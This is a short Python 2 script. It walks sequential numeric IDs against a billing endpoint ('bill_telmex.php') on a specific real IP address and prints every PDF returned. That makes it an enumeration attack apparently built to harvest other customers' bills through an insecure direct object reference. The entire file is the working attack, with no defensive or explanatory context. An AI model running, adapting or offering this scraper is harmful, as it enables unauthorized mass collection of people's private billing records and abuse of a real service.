import pyPdf
import httplib
num=19430007
while True:
    conection = httplib.HTTPConnection("190.27.201.2")
    conection.request("GET", "/bill_telmex.php?JULIO="+str(num))
    response = conection.getresponse()
    if response.getheader('content-type')=='application/pdf':
        print num
        pdf =response.read()
        print pdf
    num=num+1
